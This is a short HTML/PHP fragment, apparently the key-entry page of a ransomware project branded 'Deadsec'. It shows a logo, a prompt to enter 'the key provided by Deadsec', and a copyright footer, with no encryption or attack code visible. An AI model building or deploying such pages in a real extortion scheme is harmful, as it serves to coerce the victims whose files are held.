...
<head>
	...
	<![endif]-->
    <title>Deadsec - Ransomeware</title>
...
<body>
	<div class="container">
		<form id="contact">
			<a href="" title="DeadSec - Ransomeware">
				<img id="logo" title="deadsec" src="img/logo.png" alt="deadsec" width="210px"/>
			</a>
			<h1 id="main-title">Deadsec</h1>
			<fieldset>
				<h4 id="sub-title">Enter the key provided by Deadsec.</h4>
			...
			<p class="copyright">Copyright &copy; <?php echo date("Y"); ?> <a title="Technowlogy" href="https://www.deadsec.com/" target="_blank">Technowlogy</a>  - Deadsec. All rights reserved.</p>
		</form>
	</div>
